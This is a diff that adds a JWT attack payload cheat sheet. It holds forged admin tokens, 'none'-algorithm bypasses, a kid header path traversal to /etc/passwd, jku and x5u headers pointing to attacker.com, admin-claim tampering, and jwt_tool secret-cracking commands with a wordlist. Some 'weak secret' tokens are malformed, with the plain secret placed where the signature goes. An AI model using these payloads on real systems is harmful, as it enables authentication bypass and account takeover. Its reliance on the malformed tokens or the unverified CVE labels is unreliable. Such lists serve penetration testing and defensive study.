@@ -1,0 +1,219 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# JWT (JSON Web Token) Security Testing Payloads
+# ============================================
+
+## Weak/Hardcoded Secrets
+### Common weak secrets
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.123456
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.password
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.admin123
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.jwt-secret
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.key
+
+### Common passwords as secrets
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret123
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Password123
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.qwerty
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.letmein
+
+## Algorithm Confusion (None Algorithm)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiYWxnIjoibm9uZSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+## Algorithm Confusion (RS256 to HS256)
+### Attacker signs with public key as HMAC secret
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.<public_key_as_hmac_secret>
+
+## Key ID (kid) Header Injection
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../../../dev/null"
+}
+
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../../../etc/passwd"
+}
+
+## JWK (JSON Web Key) Injection
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "attacker-key",
+    "n": "attacker-controlled-key"
+  }
+}
+
+## JKU (JWK Set URL) Injection
+{
+  "alg": "RS256",
+  "jku": "https://attacker.com/jwks.json"
+}
+
+## X5U (X.509 URL) Injection
+{
+  "alg": "RS256",
+  "x5u": "https://attacker.com/cert.pem"
+}
+
+## X5C (X.509 Certificate Chain) Injection
+{
+  "alg": "RS256",
+  "x5c": ["attacker-controlled-certificate"]
+}
+
+## Claims Manipulation
+### Adding admin claim
+{
+  "user": "user",
+  "role": "admin",
+  "isAdmin": true,
+  "admin": true
+}
+
+### Modifying expiration
+{
+  "user": "user",
+  "exp": 9999999999
+}
+
+### Empty signature attempt
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+## Common JWT Headers
+### Standard
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+### With Key ID
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key-2023"
+}
+
+### With Content Type
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "cty": "JWT"
+}
+
+## Token Structure Manipulation
+### Missing parts
+header.payload.
+header..
+signature
+.payload.signature
+
+### Multiple dots
+header..payload..signature
+header...payload...signature
+
+## Payload Claims Testing
+### Standard claims
+{
+  "iss": "issuer",
+  "sub": "subject",
+  "aud": "audience",
+  "exp": 1234567890,
+  "nbf": 1234567890,
+  "iat": 1234567890,
+  "jti": "unique-id"
+}
+
+### Custom claims
+{
+  "user": "admin",
+  "role": "administrator",
+  "permissions": ["*"],
+  "isAdmin": true,
+  "isSuperUser": true,
+  "access": "full"
+}
+
+## JWT Fuzzing Payloads
+### Algorithm variants
+HS256, HS384, HS512
+RS256, RS384, RS512
+ES256, ES384, ES512
+PS256, PS384, PS512
+none, None, NONE, nOnE
+
+### Typ header variations
+JWT, jwt, JwT
+JOSE, jose, Jose
+json, JSON, Json
+
+## Encoding/Decoding Attacks
+### URL encoding
+%7B%22alg%22%3A%22HS256%22%2C%22typ%22%3A%22JWT%22%7D
+### Base64 URL variants
+Standard base64 vs base64url
+Padding/no padding variations
+
+## JWT Tools Commands
+### jwt_tool.py
+python3 jwt_tool.py <token> -t -rc jwt-wordlist.txt
+python3 jwt_tool.py <token> -S -d /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py <token> -X k
+python3 jwt_tool.py <token> -X a
+
+### jwt.io decode
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+## Wordlist for JWT Secrets
+secret
+password
+123456
+admin
+jwt
+token
+key
+private
+public
+your-256-bit-secret
+test
+dev
+prod
+staging
+api
+service
+application
+my-secret-key
+auth-token
+session
+login
+
+## Common JWT Libraries Vulnerabilities
+### Node.js jsonwebtoken < 8.0.0
+Algorithm confusion with 'none'
+
+### PyJWT < 1.5.2
+Key confusion attack
+
+### jwt-go < 3.2.1
+Audience claim bypass
+
+### PHP firebase/php-jwt < 5.0.0
+Key ID injection
+
+## CVE References
+CVE-2015-9235: Auth0 bypass
+CVE-2016-10034: Algorithm confusion
+CVE-2018-1000539: Key confusion
+CVE-2019-7644: Key ID injection
+CVE-2020-28042: Algorithm confusion
+CVE-2022-23529: jsonwebtoken verification bypass
